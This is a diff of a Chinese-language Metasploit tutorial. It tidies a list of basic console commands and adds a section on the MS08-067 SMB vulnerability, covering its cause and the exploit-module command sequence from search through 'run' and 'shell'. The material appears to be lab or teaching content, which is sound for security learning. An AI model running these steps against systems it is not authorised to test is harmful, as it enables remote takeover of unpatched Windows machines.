@@ -2426,26 +2426,11 @@ exit / quit
 退出会话或MSF控制台
 
 
-
-msfconsole
-
-
-
-？
-
-
-
-earch
-
-
-
-use
-
-
-
-exit
-
-
+1. msfconsole
+2. ？
+3. search
+4. use
+5. exit
 三、MSF 渗透测试(一) MS08-0671. 简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
 攻击者可通过 SMB（端口445） 发送特制RPC请求，触发 NetPathCanonicalize 函数的缓冲区溢出，从而在无需身份验证的情况下执行任意代码。该漏洞曾被蠕虫病毒 Conficker 大规模利用。
 2. 命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
@@ -2616,7 +2601,7 @@ shell
 
 
 
-
+3. 攻击步骤
 启动靶机
 
 # 切换root管理员权限su root
